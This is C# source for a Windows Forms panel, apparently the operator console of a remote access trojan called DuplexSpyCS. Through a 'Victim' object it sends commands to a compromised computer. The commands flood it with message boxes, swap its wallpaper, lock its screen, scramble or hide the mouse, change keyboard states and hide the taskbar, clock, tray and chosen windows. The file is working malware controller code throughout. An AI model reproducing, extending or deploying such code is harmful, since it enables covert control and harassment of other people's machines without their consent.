/* Readme
 * 1. Messagebox
 * 2. Handle/IO
 *      Get the state of target initially.
 *      This function will change the state of target like flip-flop, that is, hide->show, show->hide; crazy->calm, calm->crazy;(true->false, false->true) etc...
 * 
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFunStuff : Form
    {
        private IniManager ini_manager;
        public Victim v;

        public frmFunStuff()
        {
            InitializeComponent();
        }

        void SendFun(params string[] para) => v.SendCommand(string.Join("|", new string[] { "fun" }.Concat(para).ToArray()));

        public void ShowWndStatus(List<Tuple<string, string>> lsStatus)
        {
            Invoke(new Action(() => listView1.Items.Clear()));

            foreach (var x in lsStatus)
            {
                ListViewItem item = new ListViewItem(x.Item1);
                item.SubItems.Add(x.Item2);

                Invoke(new Action(() =>
                {
                    listView1.Items.Add(item);
                }));
            }

            Invoke(new Action(() => toolStripStatusLabel1.Text = "Action successfully."));
        }

        void setup()
        {
            comboBox1.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            comboBox4.SelectedIndex = 0;

            listView1.FullRowSelect = true;

            radioButton1.Checked = true;
            numericUpDown1.Value = 1;
            comboBox2.SelectedIndex = 6;
            numericUpDown2.Value = 10000; //10 seconds

            SettingConfig config = C1.GetConfigFromINI();
            textBox1.Text = config.msgbox_szCaption;
            textBox2.Text = config.msgbox_szText;

            textBox6.Text = config.ballon_szTitle;
            textBox7.Text = config.ballon_szText;
            numericUpDown2.Value = config.balloon_nTime;

            v.SendCommand("fun|hwnd|init");
        }

        private void frmFunStuff_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), comboBox1.Text.Replace(",", string.Empty), true);
            MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), comboBox2.Text, true);

            MessageBox.Show(textBox2.Text, textBox1.Text, btn, icon);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string mode = null;
            if (radioButton1.Checked)
                mode = "mul|" + numericUpDown1.Value.ToString();
            else if (radioButton2.Checked)
                mode = "inf|start";

            v.encSend(2, 0, $"fun|msg|{mode}|{Crypto.b64E2Str(textBox1.Text)}|{Crypto.b64E2Str(textBox2.Text)}|{comboBox1.Text}|{comboBox2.Text.Replace(",", string.Empty)}");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "fun|msg|inf|stop");
        }

        private void button12_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Image Files(*.jpg;*.png)|*.jpg;*.png";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox3.Text = ofd.FileName;
            }
        }

        private void button15_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Image Files(*.jpg;*.png)|*.jpg;*.png";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox4.Text = ofd.FileName;
            }
        }

        private void button13_Click(object sender, EventArgs e)
        {
            string szImgFile = textBox3.Text;
            if (!File.Exists(szImgFile))
            {
                MessageBox.Show("Cannot find file: " + szImgFile, "FileNotFound", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            Image img = Image.FromFile(szImgFile);
            if (img == null)
            {
                MessageBox.Show("The variable \"img\" is null.", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szImgB64 = C2.ImageToBase64(img);
            if (string.IsNullOrEmpty(szImgB64))
            {
                MessageBox.Show("Image base64 string is null or empty.", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            v.encSend(2, 0, "fun|wp|set|" + szImgB64);
        }

        private void button14_Click(object sender, EventArgs e)
        {
            string filename = textBox4.Text;
            if (!File.Exists(filename))
            {
                MessageBox.Show("File not found: " + filename, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            v.encSend(2, 0, "fun|screen|lock|" + C2.ImageToBase64(filename));
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void button25_Click(object sender, EventArgs e)
        {
            v.SendCommand("fun|wp|get");
        }

        private void button24_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "fun|screen|ulock");
        }

        //Mouse - Crazy
        private void miMouseCrazy_Click(object sender, EventArgs e)
        {
            SendFun("mouse", "crazy");
        }
        //Mouse - Lock
        private void miMouseLock_Click(object sender, EventArgs e)
        {
            SendFun("mouse|lock");
        }
        //Mouse - Hide
        private void miMouseHide_Click(object sender, EventArgs e)
        {
            SendFun("mouse|hide");
        }

        //Keyboard - Enable
        private void miKeyboardEnable_Click(object sender, EventArgs e)
        {
            v.SendCommand("keyboard|enable");
        }
        //Keyboard - Smile
        private void miKeyboardSmile_Click(object sender, EventArgs e)
        {
            v.SendCommand("keyboard|smile");
        }

        //HWnd - Desktop Icon
        private void miHWndDesktopIcon_Click(object sender, EventArgs e)
        {
            SendFun("hwnd", "deskicon");
        }
        //HWnd - Tray
        private void miHWndTray_Click(object sender, EventArgs e)
        {
            SendFun("hwnd", "tray");
        }
        //HWnd - Taskbar
        private void miHWndTaskbar_Click(object sender, EventArgs e)
        {
            SendFun("hwnd", "taskbar");
        }
        //HWnd - Clock
        private void miHWndClock_Click(object sender, EventArgs e)
        {
            SendFun("hwnd", "clock");
        }
        //HWnd - StartOrb
        private void miHWndStartOrb_Click(object sender, EventArgs e)
        {
            SendFun("hwnd", "startorb");
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            try
            {
                int hWnd = int.Parse(textBox5.Text); //check value is integer.
                SendFun("hwnd", "hide", hWnd.ToString());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button5_Click_1(object sender, EventArgs e)
        {
            try
            {
                int hWnd = int.Parse(textBox5.Text); //check value is integer.
                SendFun("hwnd", "show", hWnd.ToString());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //Balloon tip - Test
        private void button6_Click_1(object sender, EventArgs e)
        {
            try
            {
                ToolTipIcon icon = (ToolTipIcon)Enum.Parse(typeof(ToolTipIcon), comboBox3.Text);
                Icon sysIcon = null;
                switch (comboBox4.SelectedIndex)
                {
                    case 0:
                        sysIcon = SystemIcons.Application;
                        break;
                    case 1:
                        sysIcon = SystemIcons.Asterisk;
                        break;
                    case 2:
                        sysIcon = SystemIcons.Error;
                        break;
                    case 3:
                        sysIcon = SystemIcons.Exclamation;
                        break;
                    case 4:
                        sysIcon = SystemIcons.Hand;
                        break;
                    case 5:
                        sysIcon = SystemIcons.Information;
                        break;
                    case 6:
                        sysIcon = SystemIcons.Question;
                        break;
                    case 7:
                        sysIcon = SystemIcons.Shield;
                        break;
                    case 8:
                        sysIcon = SystemIcons.Warning;
                        break;
                    case 9:
                        sysIcon = SystemIcons.WinLogo;
                        break;
                }

                NotifyIcon notify = new NotifyIcon()
                {
                    Icon = sysIcon,
                    Visible = true
                };
                notify.ShowBalloonTip((int)numericUpDown2.Value, textBox6.Text, textBox7.Text, icon);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //Balloon tip - Go
        private void button7_Click_1(object sender, EventArgs e)
        {
            v.SendCommand($"fun|balloontip|{(int)numericUpDown2.Value}|{comboBox4.SelectedIndex}|{comboBox3.Text}|{Crypto.b64E2Str(textBox6.Text)}|{Crypto.b64E2Str(textBox7.Text)}");
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            v.SendCommand("fun|hwnd|init");
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.F5)
            {
                v.SendCommand("fun|hwnd|init");
            }
        }

        private void miMouseTrails_Click(object sender, EventArgs e)
        {
            SendFun("mouse", "trails");
        }
    }
}